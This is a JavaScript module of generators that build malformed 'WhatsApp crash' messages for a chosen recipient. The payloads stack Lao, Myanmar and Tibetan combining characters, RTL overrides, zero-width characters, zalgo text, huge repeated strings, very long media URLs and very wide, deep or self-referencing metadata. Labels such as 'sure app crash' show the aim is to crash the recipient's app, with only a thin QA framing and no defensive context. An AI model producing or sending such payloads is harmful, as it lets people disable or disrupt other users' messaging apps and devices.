const USER_SPECIAL_CHARS = [
  "ລັ້ວ່ັໃ່້ົັໍໝ้້້",           // Lao
  "ျှျှျှျှျှျှ",                // Myanmar
  "ཧྷྐྵྨྭྺྻྜྩྣྡྦྫྷྰྴྵ"     // Tibetan
].join(" ");

const UNICODE_EDGE_CASES = [
  '\u202E',      // RTL override
  '\u200B',      // Zero-width space
  '\uFFFC',      // Object replacement
  '👩‍👩‍👧‍👧',     // ZWJ emoji
  '\u0338',      // Overlays
  '\uFFFDbad\u0000string'
].join(' ');

// Zalgo/combining-marks generator
function zalgo(str, layers = 10) {
  const combining = ['\u0300', '\u0317', '\u0323', '\u035B', '\u0361', '\u0362'];
  let out = str;
  for (let l = 0; l < layers; l++) {
    for (let i = 0; i < combining.length; i++) out += combining[i];
  }
  return out;
}

// Wide object generator
function makeWideObject(width = 3000) {
  let wide = {};
  for (let i = 0; i < width; i++) wide[`w${i}`] = `val${i}`;
  return wide;
}

// Deep Powerfull object
function makeDeepObject(depth = 20) {
  if (depth === 0) return { end: true };
  return { deep: makeDeepObject(depth - 1) };
}

// Crashed-style metadata (Advanced)
function makeCrashedMetadata() {
  return {
    corrupted: true,
    recursive: {},
    unicode: USER_SPECIAL_CHARS + UNICODE_EDGE_CASES,
    longArray: Array(10000).fill(USER_SPECIAL_CHARS),
    overflow: "x".repeat(200000), // 200k chars
    get self() { return this; }
  };
}

// broken media URLs
const CRASHED_VIDEO_LINK = "https://example.com/video-" + "A".repeat(3072) + ".mp4";
const CRASHED_IMAGE_LINK = "https://example.com/image-" + "B".repeat(4096) + ".jpg";

// powwrfull message template
const messageTemplate = {
  to: '',
  message: '',
  metadata: {
    timestamp: Date.now(),
    type: 'crash'
  }
};

// Basic payload generator
const generateCrashPayload = (options = {}) => ({
  ...messageTemplate,
  ...options,
});

// Advanced whatsapp crash test payload generator
const generateAdvancedPayload = (options = {}) => {
  const repeatUnicode = options.repeatUnicode || 7000;
  const wideFields = options.wideFields || 3500;
  const deepNesting = options.deepNesting || 22;

  const body = [
    USER_SPECIAL_CHARS,
    UNICODE_EDGE_CASES,
    zalgo("QA!🔥", 18),
    "💥".repeat(3000),
    USER_SPECIAL_CHARS.repeat(100)
  ].join(' | ');

  return {
    to: options.to || '',
    message:
      body + "\n" +
      zalgo(USER_SPECIAL_CHARS, 10) + "\n" +
      "A".repeat(repeatUnicode) + "\n" +
      USER_SPECIAL_CHARS + "\n" +
      UNICODE_EDGE_CASES,
    crashedVideo: CRASHED_VIDEO_LINK,
    crashedImage: CRASHED_IMAGE_LINK,
    crashedMetadata: makeCrashedMetadata(),
    metadata: {
      timestamp: Date.now(),
      type: "qa-test",
      wide: makeWideObject(wideFields),
      deep: makeDeepObject(deepNesting),
      userSpecial: USER_SPECIAL_CHARS
    }
  };
};

// Extreme malformation
const advancedMalformedPayload = ({
  to = '',
  depth = 25,
  width = 7000,
  longString = 60000
} = {}) => ({
  to,
  message: `${"A".repeat(longString)}\n${USER_SPECIAL_CHARS}\n${UNICODE_EDGE_CASES}\n`,
  weirdArr: Array.from({length: width}, (_, i) => (i % 2 === 0 ? null : undefined)),
  weirdObj: {
    ...makeWideObject(width),
    bool: true,
    number: 12345.6789,
    func: function() {},
    symbol: Symbol("weird"),
    nested: makeDeepObject(depth),
    subarr: [NaN, Infinity, -Infinity, '', [], {}, /regExp/],
    unionField: [USER_SPECIAL_CHARS, 123, true, undefined, null]
  },
  crashedVideo: CRASHED_VIDEO_LINK,
  crashedImage: CRASHED_IMAGE_LINK,
  crashedMetadata: makeCrashedMetadata(),
  metadata: {
    timestamp: Date.now(),
    type: "sure app crash malformed",
    note: "For maximum boundary!",
    unicode: USER_SPECIAL_CHARS
  }
});

module.exports = {
  messageTemplate,
  generateCrashPayload,
  generateAdvancedPayload,
  advancedMalformedPayload
};
